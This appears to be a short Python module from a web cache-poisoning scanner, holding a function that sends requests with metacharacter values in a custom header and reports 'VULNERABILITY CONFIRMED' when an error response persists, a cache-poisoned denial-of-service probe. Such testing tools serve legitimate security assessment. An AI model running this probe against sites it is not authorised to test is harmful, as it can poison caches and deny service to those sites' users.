#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import traceback


requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def HMC(url, s, main_status_code, authent):
    #HTTP Metachar Header
    chars = [r"\n", r"\a", r"\r"]
    for c in chars:
        headers = {"X-Metachar-Header": c}
        req_hmc = s.get(url, headers=headers, timeout=10, verify=False, auth=authent, allow_redirects=False)
        if req_hmc.status_code in [400, 413, 500] and req_hmc.status_code != main_status_code:
            req_verify_hmc = s.get(url, verify=False, timeout=10, auth=authent)
            if req_verify_hmc.status_code == req_hmc.status_code and req_verify_hmc.status_code != main_status_code:
                print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | HMC DOS: {} | \033[34m{} > {}\033[0m | PAYLOAD: {}".format(url, main_status_code, req_verify_hmc.status_code, headers))